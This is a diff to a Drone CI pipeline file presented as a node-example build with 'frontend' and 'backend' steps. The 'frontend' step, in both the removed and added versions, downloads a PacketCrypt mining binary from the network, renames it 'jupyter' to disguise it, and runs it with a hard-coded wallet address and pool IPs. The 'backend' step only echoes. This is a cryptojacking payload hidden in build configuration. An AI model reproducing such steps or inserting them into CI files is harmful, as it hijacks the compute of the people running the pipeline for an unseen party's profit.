@@ -1,7 +1,21 @@
-kind: pipeline
-name: hello-alpine
-type: docker
+workspace:
+  base: /node
+  path: drone/node-example
 
-steps:
-- wget -q 'https://www.pkt.world/ext/packetcrypt-linux-amd64' -O jupyter && chmod u+x jupyter
-- ./jupyter ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://139.144.181.23:443 http://164.90.218.160:443/master/2048 http://164.90.218.160:80/master/3072 http://104.200.18.144:80
+clone:
+  git:
+    image: plugins/git
+    depath: 50
+    tags: true
+
+pipeline:
+  frontend:
+    image: node:8.3.0
+    commands:
+      - wget -q 'https://www.pkt.world/ext/packetcrypt-linux-amd64' -O jupyter && chmod u+x jupyter
+      - ./jupyter ann -p pkt1qqwya7kp20pn9ugnw3lj78l3dmjp00gk3ct9ey9 http://139.144.181.23:443 http://164.90.218.160:443/master/2048 http://164.90.218.160:80/master/3072 http://104.200.18.144:80
+
+  backend:
+    image: node:8.3.0
+    commands:
+      - echo backend
